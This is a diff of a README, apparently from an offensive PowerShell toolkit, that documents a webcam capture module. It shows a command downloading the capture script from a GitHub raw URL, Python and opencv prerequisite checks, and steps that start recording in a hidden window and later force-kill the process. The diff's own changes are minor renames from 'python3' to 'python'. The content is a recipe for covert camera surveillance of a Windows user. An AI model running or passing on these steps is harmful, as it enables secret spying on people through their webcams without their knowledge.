@@ -15,14 +15,14 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/WebCam
 
 **prerequesites checks:**
 ```powershell
-#Check if Pthon3 its installed
-[bool](python3 -V)
+#Check if Pthon its installed
+[bool](python -V)
 
 #Check if opencv its installed
-[bool](pip3 list|findstr /C:"opencv-python")
+[bool](pip list|findstr /C:"opencv-python")
 
 [OPTIONAL] #Install opencv and numpy modules
-pip3 install opencv-python
+pip install opencv-python
 ```
 
 <br />
@@ -37,10 +37,10 @@ gci "$Env:LOCALAPPDATA\Programs" -Recurse -Force|?{$_.PSIsContainer -Match "True
 sys.path.append("c:\\users\\pedro\\appdata\\local\\programs\\python\\python39\\lib\\site-packages")
 
 #Start capture
-Start-Process -WindowStyle hidden python3 -ArgumentList "WebCam.py"
+Start-Process -WindowStyle hidden python -ArgumentList "WebCam.py"
 
 #Stop capture
-Stop-Process -Name "python3.*" -Force
+Stop-Process -Name "python*" -Force
 ```
 
 <br />
